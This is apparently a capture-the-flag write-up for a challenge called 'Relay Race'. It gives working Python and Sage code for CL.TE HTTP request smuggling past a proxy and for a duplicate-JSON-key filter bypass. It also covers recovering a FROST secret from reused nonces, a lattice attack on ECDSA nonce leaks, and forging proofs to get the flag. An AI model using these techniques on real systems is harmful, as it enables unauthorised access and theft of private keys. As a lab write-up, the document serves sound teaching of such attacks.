# Relay Race

## Challenge Info

**Category:** Cryptography   
**Points:** 250   
**Challenge Description:**

```
Who doesn't love relay races?
```

## Recon

This challenge has 2 Node.js services running together: a public edge proxy on port 8080 and an internal origin on port 3000. The origin protects the flag behind a chain of cryptographic checks that must be solved in order. The edge filters and forwards requests using a custom HTTP parser.

The edge parses requests using `Content-Length` while the origin uses `Transfer-Encoding: chunked`. This CL.TE mismatch enables request smuggling. The origin honors `Transfer-Encoding: chunked` and stops reading at `0\r\n\r\n` while the edge uses `Content-Length` and continues forwarding the remaining bytes. Those leftover bytes are therefore interpreted by the origin as a new HTTP request allowing us to reach `GET /internal/lease` which is blocked by the edge.

The edge caches relay policies per bucket at `GET /assets/policy.mjs?bucket=...`. It checks operations via regex that matches the first `"operation"` key while `JSON.parse` takes the last duplicate key. Sending `{"operation":"audit","operation":"frost-trace",...}` passes the edge but delivers `frost-trace` mode to origin returning the FROST artifact.

The FROST signing in crypto-state.js derives the participant nonces once and reuses them across all three sessions. Each participant i in session j produces:

```
z{i,j} = r{i} + f{i,j} * R{i} + λ{i} * c{j} * s{i} (mod N)
```

Here r{i} and R{i} remain constant across sessions, while f{i,j} is the binding factor hashed with domain "test", λ{i} is the Lagrange coefficient, c{j} is the session challenge, and s{i} is the Shamir share. Three sessions give us three equations that can be solved for s{i} using Gaussian elimination. With two shares and the reconstruction coefficients λ₁ = 2 and λ₂ = -1, the group secret is recovered as:

```
rootSecret = 2*s{1} - s{2} (mod N)
```

The origin next requires a DLEQ proof of knowledge of rootSecret, using the public parameters from GET /api/attestation. We choose a random scalar k and compute the commitments:

```
C{G} = kG
C{H} = kH
```

We then hash the public parameters and commitments to produce a challenge c. This challenge acts as the verifier's question but is generated from the proof transcript so no interactive exchange is needed. We respond with:

```
r = k + c*rootSecret (mod N)
```

A valid response proves that the same secret links the two public points and unlocks the vault.

The vault contains 27 ECDSA signatures where each nonce leaks 120 of 256 bits: 40 low bits in `spill` and 80 high bits in `carry` base64url encoded. The middle 136 bits are unknown. With `k = A + mid*2^{40}` the ECDSA equation `k*s - m = r*x (mod N)` becomes `mid = a*x + b (mod N)`. This is the Hidden Number Problem. A lattice built from the known `a,b` values is reduced via LLL recovering `recoverySecret` as the second to last column of the short vector.

The vault also holds an ECIES payload encrypted with AES-256-GCM. The shared secret is `ephemeralPublic * recoverySecret` computable with known `recoverySecret`. Decryption gives `delegationScalar` (releaseSecret) and a ticket.

The final step is a Schnorr release proof. Get `redemptionNonce` and `releasePublic` from `GET /api/redemption`, commit to random `k`, compute challenge with domain `"relay/release-schnorr/v1"` and respond. A valid proof at `POST /api/redeem` returns the flag.

## Exploitation

First smuggle a request past the edge to steal the lease token. The payload crafts a CL.TE desync: the chunked body `0\r\n\r\n` ends the origin's view while Content-Length covers a trailing `GET /internal/lease`:

```python
smug = "GET /internal/lease HTTP/1.1\r\nHost: x\r\n\r\n"
c0 = f"0\r\n\r\n{smug}"
sock.sendall(
    f"POST /api/ping HTTP/1.1\r\nHost: 127.0.0.1:8080\r\n"
    f"Transfer-Encoding: chunked\r\nContent-Length: {len(c0)}\r\n\r\n{c0}"
    "GET /api/ping HTTP/1.1\r\nHost: x\r\n\r\n"
)
```

The edge forwards everything. The origin parses the chunked body, stops at `0\r\n\r\n` and processes the trailing `GET /internal/lease` as a new request. Parse the second response body for the lease:

```json
{"lease":"g9_1K3klMhR0anLa-r2J_Qe6","scope":"relay-preview"}
```

Prime the policy cache to set frost trace mode and then POST to relay with duplicate JSON keys:

```python
api("GET", "/assets/policy.mjs?bucket=deadbeefcafe1234", hdrs={"X-Relay-Mode":"frost-trace"})
frost = api("POST", "/api/relay?bucket=deadbeefcafe1234",
    raw_body='{"operation":"audit","operation":"frost-trace","lease":"%s"}' % lease)
```

The edge regex sees `"audit"` and allows the request. It attaches `X-Relay-Policy: frost-trace` from its cache. The origin's `JSON.parse` sees `"frost-trace"` and returns the FROST artifact with 3 sessions and 2 participants.

From the artifact extract `groupPublic`, compute `commitmentEncoding` from participant hiding/binding points, compute binding factors with domain `"test"` and challenges with `"relay/frost/challenge/v1"`. For each participant solve the 2×2 linear system after subtracting session 0 from sessions 1 and 2:

```python
for pid, lm_val in [(1, 2), (2, n - 1)]:
    z = [Integer(s["partials"][pid-1]["response"]) for s in frost["sessions"]]
    cv = [hs("relay/frost/challenge/v1", ...) for s in frost["sessions"]]
    fv = [hs("test", gb, ce, s["message"], pid) for s in frost["sessions"]]
    a11 = (fv[1] - fv[0]) % n; a12 = (lm_val * (cv[1] - cv[0])) % n; b1 = (z[1] - z[0]) % n
    a21 = (fv[2] - fv[0]) % n; a22 = (lm_val * (cv[2] - cv[0])) % n; b2 = (z[2] - z[0]) % n
    det = (a21 * a12 - a11 * a22) % n; rhs = (a21 * b1 - a11 * b2) % n
    si = (rhs * inverse_mod(Integer(det), n)) % n
root = (2 * share1 - share2) % n
assert G * int(root) == pf(frost["groupPublic"])
```

Construct a DLEQ proof with the recovered rootSecret. Get attestation parameters, commit to a random scalar, compute the challenge and submit:

```python
att = api("GET", "/api/attestation")
k = Integer(randint(1, n - 1))
CG = G * int(k); CH = pf(att["baseH"]) * int(k)
ch = hs("relay/dleq/v1", pb(G), pb(pf(att["baseH"])), pb(pf(frost["groupPublic"])),
        pb(pf(att["relationPoint"])), pb(CG), pb(CH), att["nonce"])
vault = api("POST", "/api/vault", js={
    "nonce": att["nonce"], "commitmentG": pb(CG).hex(), "commitmentH": pb(CH).hex(),
    "response": str((k + ch * root) % n)})
```

The vault returns 27 ECDSA signatures. For each, extract the known 120 bits from `spill` (40 LE bits) and `carry` (80 LE bits), build the HNP coefficients `a{j} = r{j}*s{j}^{-1}*2^{-40}` and `b{j} = (m{j} - A{j}*s{j})*s{j}^{-1}*2^{-40}`. Center `b{j}` around zero by subtracting `2^{135}`. Build a lattice of dimension d+2 where the last two columns encode the secret and the padding constant:

```python
I = inverse_mod(Integer(2**40), n)
for rec in vault["records"][:12]:
    up = int.from_bytes(b64d(rec["trace"]["carry"]), "little")
    lo = int.from_bytes(b64d(rec["trace"]["spill"]), "little")
    A = (up << 176) | lo
    a.append((inv_s * rv * I) % n)
    bv.append(((inv_s * mv - A) * I - 2**135) % n)
X = matrix(ZZ, d+2, d+2)
for i in range(d):
    X[i,i] = n * 2**121; X[d,i] = int(a[i]) * 2**121; X[d+1,i] = int(bv[i]) * 2**121
X[d,d] = 1; X[d+1,d+1] = 2**135
for row in X.LLL():
    if abs(row[-1]) == 2**135:
        x = Integer(row[d]) if row[-1] > 0 else Integer(-row[d])
```

12 signatures suffice. Verify `G * x == vault["recoveryPublic"]`.

Decrypt the ECIES payload with the recovered secret:

```python
shared = pf(vault["ecies"]["ephemeralPublic"]) * int(x)
key = sha256("relay/ecies/aes-gcm/v1", pb(shared))
pt = AES.new(key, AES.MODE_GCM, nonce=b64d(ec["iv"])).decrypt_and_verify(
    b64d(ec["ciphertext"]), b64d(ec["tag"]))
inner = json.loads(pt.decode())
releaseSecret = int.from_bytes(bytes.fromhex(inner["delegationScalar"]), "big")
ticket = inner["ticket"]
```

Forge the Schnorr signature. Get redemption parameters, commit to a random scalar, compute challenge with the ticket:

```python
red = api("GET", "/api/redemption")
k2 = Integer(randint(1, n - 1))
R2 = G * int(k2)
msg = f"nonce={red['nonce']}\nticket={ticket}"
ch2 = hs("relay/release-schnorr/v1", pb(R2), pb(pf(red["releasePublic"])), msg)
flag = api("POST", "/api/redeem", js={
    "nonce": red["nonce"], "ticket": ticket, "commitment": pb(R2).hex(),
    "response": str((k2 + ch2 * releaseSecret) % n)})
print(flag["flag"])
```

The solve script is [here](./solve.sage).

## Flag

```
encryptid{...}
```

*Writeup written by Aarav Juneja*
